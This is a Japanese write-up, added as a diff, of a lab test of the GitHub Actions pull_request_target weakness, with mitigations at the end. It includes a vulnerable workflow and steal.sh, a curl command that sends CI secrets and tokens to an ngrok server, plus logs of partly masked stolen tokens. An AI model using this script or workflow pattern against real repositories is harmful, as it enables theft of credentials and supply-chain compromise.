@@ -1,0 +1,179 @@
+# pull_request_target 脆弱性 検証まとめ
+
+## 背景：Trivy サプライチェーン攻撃（2026年3月）
+
+Aqua Security の脆弱性スキャナ「Trivy」が攻撃グループ TeamPCP に侵害された。
+攻撃の起点は GitHub Actions の `pull_request_target` ワークフローの脆弱な設定で、
+bot アカウント（aqua-bot）の PAT が窃取された。
+
+---
+
+## 用語整理
+
+| 用語 | 説明 |
+|---|---|
+| Runner | ワークフローを実行する GitHub のクラウド PC |
+| checkout | GitHub 上のコードを Runner にダウンロードする操作 |
+| PAT | GitHub の操作権限を持つトークン（Personal Access Token） |
+| シークレット | PAT や API キーなどをリポジトリに安全に保管する仕組み |
+
+```
+① PAT を作成（プロフィール Settings → Developer settings）
+   → 発行される値: github_pat_xxxx
+
+② リポジトリのシークレットに登録（リポジトリ Settings → Secrets）
+   Name: SECRET_TOKEN  /  Value: github_pat_xxxx
+
+③ ワークフローで参照
+   env:
+     SECRET_TOKEN: ${{ secrets.SECRET_TOKEN }}
+```
+
+---
+
+## pull_request と pull_request_target の違い
+
+フォークからの PR に対する挙動が異なる。
+
+```
+pull_request（安全）
+  フォーク PR
+      │
+      ▼
+  action_required ← GitHub が承認を要求してブロック
+  シークレット → 渡されない
+
+
+pull_request_target（危険）
+  フォーク PR
+      │
+      ▼
+  承認なしで即実行
+  シークレット → Runner の環境変数に展開される  ← 攻撃者がアクセスできる
+```
+
+`pull_request_target` はフォーク PR でもシークレットを使った自動化
+（ラベル付け・通知など）をするために設計されたイベント。
+悪用されるとシークレットが盗まれる。
+
+---
+
+## 脆弱なワークフローのパターン
+
+```yaml
+on:
+  pull_request_target:          # フォーク PR でもシークレットにアクセスできる
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+          # ↑ 攻撃者のコードを Runner にダウンロード（ここが問題）
+
+      - run: bash ./steal.sh    # 攻撃者が仕込んだコードが実行される
+        env:
+          SECRET_TOKEN: ${{ secrets.SECRET_TOKEN }}
+```
+
+問題の組み合わせ：
+
+```
+pull_request_target                    head.sha での checkout
+（シークレットが環境変数に展開される） ＋ （攻撃者のコードを持ってくる）
+                  ↓
+     攻撃者のコードがシークレットにアクセスできる環境で実行される
+```
+
+---
+
+## 攻撃の全体像
+
+```
+攻撃者                              ターゲットリポジトリ（例：Trivy）
+  │                                              │
+  │  1. フォーク                                  │
+  │ ◄──────────────────────────────────────────  │
+  │                                              │
+  │  2. steal.sh を仕込んで PR 送信               │
+  │ ──────────────────────────────────────────► │
+  │                                              │
+  │              3. pull_request_target トリガー  │
+  │              4. 攻撃者のコードを checkout      │
+  │              5. steal.sh 実行                │
+  │                 → PAT が環境変数として展開      │
+  │                                              │
+  │  6. curl で PAT を攻撃者サーバーに送信         │
+  │ ◄──────────────────────────────────────────  │
+  │                                              │
+  │  7. 盗んだ PAT でタグ偽装（Imposter Commit）  │
+  │ ──────────────────────────────────────────► │
+  │     悪意あるコードを仕込んだタグを push        │
+```
+
+---
+
+## 検証結果
+
+### 環境
+
+- ターゲットリポジトリ: `codekakitai51/vulnerable-actions-test`
+- 攻撃者リポジトリ: `kitahara51/vulnerable-actions-test`（フォーク）
+- 受信サーバー: ngrok でローカルに公開
+
+### steal.sh（攻撃者がフォークに仕込むコード）
+
+```bash
+#!/bin/bash
+curl -s -X POST https://seema-unhumoured-eximiously.ngrok-free.dev/steal \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "secret=${SECRET_TOKEN}&github_token=${GITHUB_TOKEN}"
+```
+
+### ワークフローの実行結果
+
+| ワークフロー | イベント | フォーク PR への対応 | シークレット |
+|---|---|---|---|
+| vulnerable.yml | `pull_request_target` | 承認なしで**即実行** | **漏れる** |
+| safe.yml | `pull_request` | `action_required` でブロック | 漏れない |
+
+### 受信データ（攻撃者サーバー側のログ）
+
+GitHub のログ上ではマスクされるが、curl で外部送信すると生の値が届く。
+
+```
+# ダミー値での検証
+secret=super-secret-value-12345&github_token=ghs_xxxx...
+
+# PAT（fine-grained）での検証
+secret=github_pat_11A7CMB6I0JUdaL1XEraQ8_thrdu...&github_token=ghs_xxxx...
+```
+
+PAT（`github_pat_`）・GITHUB_TOKEN（`ghs_`）どちらも盗取に成功した。
+
+```
+GitHub Actions のログ      攻撃者のサーバー（受信）
+───────────────────────    ─────────────────────────────────────
+SECRET_TOKEN = ***     →   secret=github_pat_11A7CMB6I0...
+GITHUB_TOKEN = ***     →   github_token=ghs_409SkShlpuAk...
+```
+
+---
+
+## 対策
+### リポジトリ管理者側：攻撃者のコードを checkout しない
+
+```yaml
+# 危険：攻撃者のコードを checkout する
+- uses: actions/checkout@v4
+  with:
+    ref: ${{ github.event.pull_request.head.sha }}
+
+# 安全：ref を指定しない（main ブランチが使われる）
+- uses: actions/checkout@v4
+```
+
+`pull_request_target` を使う場合は PR のコードを checkout しない。
+テストは別途 `pull_request` イベントで行う。
